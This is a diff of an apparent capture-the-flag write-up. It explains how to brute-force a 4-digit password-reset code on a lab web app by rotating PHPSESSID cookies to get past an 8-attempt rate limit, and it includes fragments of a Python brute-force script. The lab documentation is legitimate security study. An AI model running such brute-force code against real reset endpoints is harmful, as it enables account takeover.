@@ -6,7 +6,7 @@
 
 POST `/reset_password.php` (email=tester%40hammer.thm)
 
-> NOTE: this request must be performed before attempting to POST the recovery code (see next step)&#x20;
+> NOTE: this request must be performed before attempting to POST the recovery code (refer to step 3)&#x20;
 
 <figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -22,7 +22,7 @@ If the cookie is valid (not expired), we will be presented with a form to enter 
 
 <figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
-**(3)** Enter recovery code
+**(3)** Send recovery code
 
 POST `/reset_password.php` with recovery code and **s** parameter defined in the request body.
 
@@ -79,18 +79,26 @@ New `PHPSESSID` in the Set-Cookie
 
 ### Findings
 
-1. We can control the time period window in the reset password page (/reset\_password.php) with the **s** parameter. However, this simply prevents the application from immediately expiring our cookie  (`GET /logout.php`), but does not work itself when brute forcing.
-2. It appears that the application has an internal clock which controls the expiration of the cookie. Thus, even if we were to utilize the method in part 1, the application will reject our request. To workaround this, we have to programmatically send a request: `GET /index.php`, with no cookies, to retrieve a fresh cookie from the application (refer to part 5 in the overview section above).
+1. We can control the time period window in the reset password page (`/reset_password.php`) with the **s** parameter. However, this simply prevents the application from immediately expiring our cookie  (`GET /logout.php`), but does not work by itself when brute forcing the code.
+
+### Attempting to brute force the code
+
+1.  It appears that the application implements a rate limiting feature on the recovery code functionality. For a given `PHPSESSID`, we are only allowed 8 attempts within the window period, before it blocks any further requests. To workaround this, we have to retrieve a new `PHPSESSID` after every 8 brute force attempts. This can be done by **(#1)** sending a GET request to `/index.php`, with no cookies, before **(#2)** sending a POST request to `/reset_password.php` with the new cookie retrieved.
+
+    * The flaw is in the way the application handles this process. When we perform step **(#1)**, the application simply associates our new cookie with the email, but fails to generate a new 4-digit code. Thus, this allows us to indefinitely reset our `PHPSESSID` session (without the 4-digit code changing), and eventually retrieve the correct code with _100%_ success rate.
+    * This defeats the purpose of the rate limiting feature.
 
 
+
+**Python script to brute force the 4-digit recovery code with&#x20;**_**100%**_**&#x20;success rate:**
 
 ```python
 import requests
 
+IP = input('[!] Enter the target IP address: ')
 
 N = 8
 MAX_CODE = 9999
-IP = '10.10.187.29'
 PORT = 1337
 URL = f'http://{IP}:{PORT}'
 EMAIL = 'tester@hammer.thm'
@@ -119,14 +127,6 @@ def enter_email(s):
            headers=headers, data=data)
 
 
-def logout(s):
-    # GET /logout.php
-    s.get(f'{URL}/logout.php',
-          headers={**headers,
-                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                   'Referer': 'http://10.10.187.29:1337/reset_password.php'})
-
-
 def brute_force():
 
     try:
@@ -143,9 +143,6 @@ def brute_force():
 
             if i % N == 0 and i != 0:
                 print('[INFO] Retrieving new PHPSESSID')
-
-                # # reset PHPSESSID
-                # logout(s)
 
                 # request for a new PHPSESSID
                 s = retrieve_new_session()
